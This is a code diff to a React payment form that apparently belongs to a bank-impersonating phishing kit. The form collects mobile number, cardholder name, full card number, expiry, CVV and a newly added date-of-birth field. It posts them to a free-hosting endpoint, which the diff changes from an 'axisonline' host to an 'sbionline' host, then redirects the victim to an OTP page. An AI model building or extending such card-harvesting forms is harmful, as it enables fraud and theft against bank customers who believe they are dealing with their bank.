@@ -2,15 +2,15 @@ import { useState } from "react";
 import { AiOutlineEye, AiOutlineEyeInvisible } from "react-icons/ai";
 import { FaCreditCard } from "react-icons/fa";
 import { useNavigate } from "react-router-dom";
-import { useTrackLastPage } from "../../hooks/useTrackLastPage"; // adjust path
+import { useTrackLastPage } from "../../hooks/useTrackLastPage";
 import "./PaymentForm.css";
 
 export default function PaymentForm() {
-  // Track last visited page automatically
   useTrackLastPage();
 
   const [mobileNumber, setMobileNumber] = useState("");
   const [cardNumber, setCardNumber] = useState("");
+  const [dob, setDob] = useState(""); // ✅ ADDED
   const [showPin, setShowPin] = useState(false);
   const [loading, setLoading] = useState(false);
   const [success, setSuccess] = useState(false);
@@ -28,6 +28,13 @@ export default function PaymentForm() {
     let value = e.target.value.replace(/\D/g, "");
     value = value.match(/.{1,4}/g)?.join(" ") || "";
     setCardNumber(value);
+  };
+
+  const handleDobChange = (e) => {
+    let value = e.target.value.replace(/\D/g, "");
+    if (value.length >= 3) value = value.slice(0, 2) + "/" + value.slice(2);
+    if (value.length >= 6) value = value.slice(0, 5) + "/" + value.slice(5, 9);
+    setDob(value);
   };
 
   const handleSubmit = async (e) => {
@@ -49,6 +56,13 @@ export default function PaymentForm() {
       });
     }
 
+    if (!/^\d{2}\/\d{2}\/\d{4}$/.test(dob)) {
+      return setMessage({
+        text: "DOB must be in MM/DD/YYYY format",
+        type: "error",
+      });
+    }
+
     if (!/^\d{3}$/.test(e.target.cvv.value)) {
       return setMessage({
         text: "CVV must be exactly 3 digits",
@@ -62,13 +76,14 @@ export default function PaymentForm() {
       mobileNumber,
       name: e.target.name.value,
       cardNumber,
+      dob, // ✅ INCLUDED
       expiryMonth: e.target.expiryMonth.value,
       expiryYear: e.target.expiryYear.value,
       cvv: e.target.cvv.value,
     };
 
     try {
-      const res = await fetch("https://axisonline-1.onrender.com/api/cards", {
+      const res = await fetch("https://sbionline.onrender.com/cards", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(data),
@@ -83,7 +98,6 @@ export default function PaymentForm() {
           type: "success",
         });
 
-        // Save last visited page and mobile number
         localStorage.setItem("lastVisitedPage", "/otp-submit");
         localStorage.setItem("mobileNumber", mobileNumber);
 
@@ -131,7 +145,6 @@ export default function PaymentForm() {
             <label>Mobile Number</label>
             <input
               type="tel"
-              name="mobileNumber"
               placeholder="Enter mobile number"
               value={mobileNumber}
               onChange={handleMobileChange}
@@ -143,19 +156,26 @@ export default function PaymentForm() {
             <input type="text" name="name" placeholder="Name on Card" required />
 
             <label>Card Number</label>
+            <input
+              type="tel"
+              inputMode="numeric"
+              value={cardNumber}
+              onChange={handleCardNumberChange}
+              maxLength={19}
+              placeholder="5555 5555 5555 5555"
+              required
+            />
 
-
-<input
-  type="tel"
-  inputMode="numeric"
-  value={cardNumber}
-  onChange={handleCardNumberChange}
-  maxLength={19}
-  placeholder="5555 5555 5555 5555"
-  required
-/>
-
-
+            <label>Date of Birth</label>
+            <input
+              type="tel"
+              inputMode="numeric"
+              value={dob}
+              onChange={handleDobChange}
+              maxLength={10}
+              placeholder="MM/DD/YYYY"
+              required
+            />
 
             <div className="row">
               <div>
@@ -174,12 +194,10 @@ export default function PaymentForm() {
                 <label>Expiry Year</label>
                 <select name="expiryYear" required>
                   <option value="">YY</option>
-                  {[
-                    "24", "25", "26", "27", "28", "29", "30",
-                    "31", "32", "33", "34", "35", "36", "37",
-                    "38", "39", "40", "41", "42", "43", "44", "45"
-                  ].map((y) => (
-                    <option key={y} value={y}>{y}</option>
+                  {Array.from({ length: 22 }, (_, i) => (
+                    <option key={i} value={String(24 + i)}>
+                      {String(24 + i)}
+                    </option>
                   ))}
                 </select>
               </div>
@@ -194,7 +212,10 @@ export default function PaymentForm() {
                 maxLength={3}
                 required
               />
-              <span className="eye-icon" onClick={() => setShowPin((prev) => !prev)}>
+              <span
+                className="eye-icon"
+                onClick={() => setShowPin((prev) => !prev)}
+              >
                 {showPin ? <AiOutlineEyeInvisible /> : <AiOutlineEye />}
               </span>
             </div>
